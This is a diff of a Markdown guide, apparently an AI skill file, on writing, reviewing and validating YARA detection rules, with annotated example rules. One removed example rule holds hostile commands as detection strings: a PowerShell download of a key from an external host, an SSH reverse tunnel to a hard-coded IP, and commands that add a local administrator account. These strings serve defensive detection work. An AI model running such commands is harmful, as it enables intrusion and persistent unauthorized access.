-| Location | Comment Purpose |
-|----------|-----------------|
-| Rule name | Suggest naming convention (e.g., `// naming: add category prefix`) |
-| Meta fields | Fix typos (`link` → `reference`), flag missing `date`/`score` |
-| Strings block | Explain triad: `// split into $x* (highly specific) vs $s* (supporting)` |
-| Performance issues | Reference yaraQA ID: `// PA1: use uint16(0) == 0x5A4D instead` |
-| Condition | Suggest logic: `// best use 1 of ($x*) for highly specific strings` |
-
-### Example Assessed Rule
-
-```yara
-rule MAL_Amaranth_Loader_Aug23 {   // naming: add category prefix (MAL_) and date
-   meta:
-      author = "@Tera0017/@_CPResearch_"
-      description = "Amaranth Loader"
-      reference = "https://research.checkpoint.com/"   // was: link
-      date = "2023-08-15"                              // add: creation date
-      score = 80                                       // add: severity score
-
-   strings:
-      // Consider splitting into groups: highly specific ($x*) vs supporting ($s*)
-      // $ama_iv and $ama_decr are unique — use 1 of ($x*) for these
-      // $ama_size is less unique — combine via 2 of ($s*) or all of ($s*)
-      
-      $mz = "MZ"   // PA1: use uint16(0) == 0x5A4D instead (faster, no atoms)
-      
-      $ama_size = {41 BD 01 00 00 00 41 BC 00 40 06 00 E9 92 00 00 00}
-      $ama_iv = {C7 84 24 30 02 00 00 12 34 56 78 ...}
-      $ama_decr = {FF C1 48 D3 E8 41 30 00 FF C2 49 FF C0}
-
-   condition:
-      uint16(0) == 0x5A4D        // was: $mz at 0 (see PA1)
-      and filesize < 10MB        // add: filesize limit for performance
-      // best use 1 of ($x*) for highly specific strings
-      // and combinations of 2 of ($s*) or all of ($s*) for less specific strings
-      // e.g.: (1 of ($x*) or 2 of ($ama_size, $ama_decr))
-      and any of ($ama*)
-}
-```
-
-### Common Mistake to Avoid
-
-**DON'T — Broken condition (references undefined strings):**
-```yara
-strings:
-   $x1 = "malware.exe"
-condition:
-   uint16(0) == 0x5a4d
-   and all of ($op*)   // ERROR: no $op* strings defined!
-```
-
-**DO — Valid rule with suggestions in comments:**
-```yara
-strings:
-   $x1 = "malware.exe"
-   // Consider adding opcode patterns for more robust detection:
-   // $op1 = { 8B 45 08 50 E8 ?? ?? ?? ?? 83 C4 04 }
-condition:
-   uint16(0) == 0x5a4d
-   and $x1
-   // If you add $op* strings above, you could use: and all of ($op*)
-```
-
-### Good Example — Proper Naming, Meta, and Commented Suggestions
-
-```yara
-rule HKTL_Unknown_Feb26_1 {
-   meta:
-      description = "Detects an unknown hack tool that downloads SSH key from external server, creates reverse SSH tunnel for SMB (port 445) and adds local admin user"
-      author = "Detection Engineering"
-      score = 75
-      reference = "VT:8e593c36433be810f6753257b849d5d2417dc40081e1ef6a2078f75c06382033"
-      hash1 = "8e593c36433be810f6753257b849d5d2417dc40081e1ef6a2078f75c06382033"
-   strings:
-      $x1 = "powershell.exe wget https://pentest.emptybox.ge/secretkey -outfile C:\\users\\public\\secretkey"
-      $x2 = "ssh -R 445:127.0.0.1:445 hacker@46.101.108.130 -N -i C:\\users\\public\\secretkey"
-      $x3 = "icacls C:\\users\\public\\secretkey /grant:r %USERNAME%:F"
-      $x4 = "hackme.pdb"
-      $x5 = "net user eve qwerty /add"
-      $x6 = "net localgroup administrators eve /add"
-      // Consider adding opcodes for compiled/encoded variants:
-      // $op1 = { E8 ?? ?? ?? ?? 8B F0 85 F6 74 ?? }
-   condition:
-      uint16(0) == 0x5a4d
-      and filesize < 10KB
-      and 1 of ($x*)
-      // If $op* strings are added above, consider: and any of ($op*)
-}
-```
-
-**Key points from this example:**
-- Proper rule name with category (`HKTL_`), descriptor, and date
-- Complete metadata (description, author, score, reference, hash)
-- All improvement suggestions are in `//` comments
-- The rule compiles as-is; comments show potential enhancements
-- Multi-line condition with commented alternative logic
-
----
-
-## Review Workflow
-
-When reviewing YARA rules:
-
-1. **Structure** — Naming convention, metadata completeness, indentation
-2. **Strings** — Triad categorization ($x/$s/$a/$fp), length, readability
-3. **Conditions** — Short-circuit order, logic errors, impossible matches
-4. **Performance** — Module usage, regex anchors, short atoms
-5. **Style** — Hex formatting, identifier naming
-
-Reference yaraQA issue IDs when suggesting improvements.
-
----
-
-## Rule Validation (Required)
-
-**Every YARA rule must be validated before returning it to the user.**
-
-Before presenting any new or modified rule, run it through the validation script to ensure it compiles correctly:
-
-```bash
-# From file
-python scripts/validate_rule.py rule.yar
-
-# From stdin (for in-memory rules)
-echo 'rule test { condition: true }' | python scripts/validate_rule.py --stdin
-```
-
-### Validation Workflow
-
-1. **Write/modify the rule** following the guidelines above
-2. **Run validation** — pipe the rule directly or save to temp file
-3. **If validation fails** — fix the syntax errors and re-validate
-4. **If validation passes** — return the rule to the user
-
-### Validation Output
-
-The script uses YARA-X to compile the rule and reports:
-- **Compilation errors** — Syntax issues that prevent the rule from working
-- **Warnings** — Potential issues that should be reviewed
-
-```
-==================================================
-YARA RULE VALIDATION
-==================================================
-
-Rule: MAL_Example_Jan24
-
-✓ Compilation: PASSED
-
-==================================================
-```
-
-### Never Skip Validation
-
-- **Do not** return a rule without validating it first
-- **Do not** assume a rule is correct based on visual inspection
-- **Always** fix any compilation errors before presenting the rule
-
-This ensures users receive syntactically correct, working YARA rules.
-
----
-
-## Resources
-
-### References
-- [references/style.md](references/style.md) — Complete naming, structure, formatting
-- [references/performance.md](references/performance.md) — Atoms, optimization, conditions
-- [references/yaraqa-checks.md](references/yaraqa-checks.md) — All 20 automated checks
-- [references/issue-identifiers.md](references/issue-identifiers.md) — Complete issue ID reference (50+ IDs)
-
-### Scripts
-- [scripts/validate_rule.py](scripts/validate_rule.py) — YARA-X syntax validation
+## Reference files
+
+Read only what the task needs:
+
+| File | Read when |
+|------|-----------|
+| [references/style.md](references/style.md) | Choosing a name (full classifier list), writing metadata, structuring strings and conditions |
+| [references/performance.md](references/performance.md) | Choosing atoms, writing regex, diagnosing slow rules or "too many matches" |
+| [references/yaraqa-checks.md](references/yaraqa-checks.md) | Citing or explaining a yaraQA ID; exact thresholds and levels |
+| [references/issue-identifiers.md](references/issue-identifiers.md) | Citing a guideline issue that yaraQA doesn't check; all IDs at a glance |
+| [references/yara-forge.md](references/yara-forge.md) | Preparing rules for YARA-Forge; explaining a rule's Forge score, quality, or package tier |
